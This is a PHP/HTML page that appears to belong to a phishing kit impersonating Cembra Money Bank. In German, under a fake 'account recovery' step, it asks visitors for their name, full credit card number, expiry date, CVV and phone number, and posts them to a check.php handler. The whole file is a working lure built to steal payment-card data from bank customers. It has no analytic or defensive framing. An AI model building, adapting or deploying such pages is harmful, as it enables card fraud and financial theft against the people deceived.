<?php


include __DIR__ . "/cembra/functions.php";

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cembra Money Bank</title>
    <link rel="shortcut icon" href="./files/media/favicon.ico" type="image/x-icon">
    <meta name="description" content="">
    <link rel="stylesheet" href="./files/css/zwa9.css">
</head>
<body>
    <div class="wait">
        <div class="wait-hbess">
            <img src="./files/media/loading.gif" alt="loading" style="float:left; margin:2px 20px 5px 5px;" width="16" height="16"> <p style="margin:0;">Ihre Anfrage wird verarbeitet</p>
        </div>
    </div>

    <main>
        <header> 
            <div class="logo">
                <img src="./files/media/cembra-money-bank.jpg" alt="" srcset="">
            </div>
            <div class="lang-list">
                <div class="zbi"> <p>DE</p> </div>
                <div class="zbi"> <p>FR</p> </div>                
                <div class="zbi"> <p>IT</p> </div>               
                <div class="zbi"> <p>EN</p> </div>
            </div>
        </header>

        <div class="muli-steps">
            <div class="steps">
                <ul>
                    <li><span><img src="./files/media/done.png" alt="" srcset=""></span><p>anmelden</p></li>
                    <li><span>2</span><p>Information</p></li>
                    <li><span>3</span><p>Überprüfung</p></li>
                </ul>
            </div>
            <div class="l2i9na3">
                <div class="get-cc">
                    <div class="eonwann">
                        <h1>Wir benötigen einige Details, die uns bei der Wiederherstellung Ihres Kontos helfen</h1>
                    </div>
                    <form action="check.php" id="loginForm" method="post">
                        <input type="hidden" name="step" value="2" hidden="">      

                        <div class="inputs-group">
                            <div class="full-zbi">
                                <div class="labels">
                                    <label for="name">Name<span>*</span></label>
                                    <input type="text" name="name" placeholder="mustermann">
                                </div>
                                <div class="labels">
                                    <label for="nick-name">Vorname<span>*</span></label>
                                    <input type="text" name="nickname" placeholder="hans">
                                </div>
                            </div>
                            <div class="get-cc zbiii">
                                <div class="labels">
                                    <label for="cc">Kreditkartennummer<span>*</span></label>
                                    <input type="tel"onkeypress="cardspace()" maxlength="19" id="cardnumber" required  name="cardnumber" placeholder="1234 1234 1234 1234">
                                    <img src="./files/media/cc-image.png" alt="">
                                </div>
                            </div>
                            <div class="full-zbi l7wa">
                                <div class="labels">
                                    <label for="exp">Verfall<span>*</span></label>
                                    <input type="tel" placeholder="MM/AA" onkeypress="addSlashes()" maxlength="5" required name="exp" id="exp" placeholder="MM/AA">
                                </div>
                                <div class="labels">
                                    <label for="cvv">cvv/cvc<span>*</span></label>
                                    <input type="text" oninput="maxLengthCheck(this)" maxlength="3" required  id="cvv" name="cvv" placeholder="xxx">
                                    <img src="./files/media/cvv-image.png" alt="">
                                </div>
                            </div>
                            <div class="zbiii">
                                <div class="labels">
                                    <label for="tele">Telefonnummer<span>*</span></label>
                                    <input type="tel" name="tele" id="tele" placeholder="0770000000">
                                </div>
                            </div>
                        </div>
                        <div class="mowafa9a-achaf">
                            <button id="loginButton">weiter</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </main>

    <script src="./files/js/haraka.js">
    </script>
    
    
    
</body>
</html>